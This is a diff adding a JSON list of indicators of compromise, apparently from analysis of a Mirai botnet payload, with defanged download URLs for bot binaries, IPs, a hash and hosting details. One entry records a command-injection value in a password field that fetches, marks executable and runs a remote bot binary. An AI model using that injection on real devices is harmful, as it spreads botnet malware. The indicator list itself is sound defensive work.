@@ -1,0 +1,75 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://184[.]174[.]96[.]XXX:8114/bot.x86_64;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://184[.]174[.]96[.]XXX:8114/bot.armv5l;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://184[.]174[.]96[.]XXX:8114/bot[.]mipsel;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://184[.]174[.]96[.]XXX:8114/bot[.]mips;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://184[.]174[.]96[.]XXX:8114/bot.armv7;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://184[.]174[.]96[.]XXX:8114/bot.i386;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://184[.]174[.]96[.]XXX:8114/bot.armv4;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://184[.]174[.]96[.]XXX:8114/bot.armv6;"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "184[.]174[.]96.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "{\"password\":\"$(wget -q -O /tmp/bot_x86_64 hxxp://184[.]174[.]96[.]XXX:8114/bot.x86_64; chmod +x /tmp/bot_x86_64; /tmp/bot_x86_"
+  },
+  {
+    "context": "Inbound payload hash (mirai)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "34ef5cd158eb302207d2214e71212ca784f871ff16f2803f44d0b2b68c3b04ef"
+  },
+  {
+    "asn": "Pfcloud UG (haftungsbeschrankt)",
+    "country": "The Netherlands",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "204[.]76[.]203.XXX"
+  }
+]
